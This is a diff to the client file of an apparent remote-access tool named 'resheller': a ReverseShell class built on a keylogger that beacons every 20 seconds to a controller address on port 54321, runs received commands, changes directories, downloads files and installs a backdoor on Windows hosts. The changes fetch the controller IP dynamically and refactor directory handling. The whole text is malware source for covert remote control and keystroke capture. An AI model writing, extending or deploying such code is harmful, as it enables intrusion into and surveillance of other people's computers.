@@ -1,19 +1,20 @@
 #!/usr/bin/env python
 from base64 import b64encode
 from json import dumps, loads
-from os import chdir, environ, path, remove, listdir
+from os import chdir, environ, path, remove, listdir, name
 from os.path import sep
 from shutil import copyfile
 from socket import socket, AF_INET, SOCK_STREAM
 from subprocess import Popen, PIPE, call
-from sys import executable
+from sys import executable, exit
 from threading import Thread
 from time import sleep
 
 from mss import mss
 from requests import get
 
-from src.client.keylogger import KeyLogger
+from resheller.src.client.ip import get_ip
+from resheller.src.client.keylogger import KeyLogger
 
 
 class ReverseShell(KeyLogger):
@@ -24,10 +25,11 @@ class ReverseShell(KeyLogger):
         self.sock = socket(AF_INET, SOCK_STREAM)
 
     def connect(self):
+        ip = get_ip()
         while True:
             sleep(20)
             try:
-                self.sock.connect(("192.168.11.100", 54321))
+                self.sock.connect((ip, 54321))
                 self.shell()
             except ConnectionRefusedError:
                 self.connect()
@@ -41,7 +43,6 @@ class ReverseShell(KeyLogger):
                 admin = "\n[!] Running as User\n"
             else:
                 admin = "\n[+] Running as Admin\n"
-
             self.safe_send(admin)
         except ValueError:
             self.safe_send('\n[!] Cannot Perform Check\n').b_red()
@@ -110,6 +111,13 @@ class ReverseShell(KeyLogger):
             except ValueError:
                 continue
 
+    def change_dir(self, command):
+        try:
+            chdir(command[3:])
+            self.safe_send("[+]")
+        except (FileNotFoundError, OSError):
+            self.safe_send("[!] Directory Not Found")
+
     def shell(self):
         while True:
             command = self.safe_recv()
@@ -119,11 +127,7 @@ class ReverseShell(KeyLogger):
                 self.sock.close()
                 break
             elif command[:2] == 'cd':
-                try:
-                    chdir(command[3:])
-                    self.safe_send("[+]")
-                except (FileNotFoundError, OSError):
-                    self.safe_send("[!] Directory Not Found")
+                self.change_dir(command)
                 continue
             elif command[:8] == "download":
                 self.download(command)
@@ -150,7 +154,8 @@ def backdoor():
 
 
 def main():
-    backdoor()
+    if name == "nt":
+        backdoor()
     ReverseShell().connect()
 
 
